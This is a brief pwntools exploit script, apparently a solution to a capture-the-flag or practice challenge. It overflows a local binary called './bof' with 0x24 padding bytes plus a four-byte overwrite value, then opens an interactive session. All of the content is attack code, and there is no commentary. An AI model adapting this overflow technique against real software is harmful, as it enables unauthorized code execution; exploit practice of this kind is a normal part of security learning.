from pwn import *
context.log_level="debug"
p = process("./bof")
payload = b'A' * 0x24 + b'\x93\xd0\x93\xd0'
p.sendline(payload)
p.interactive()
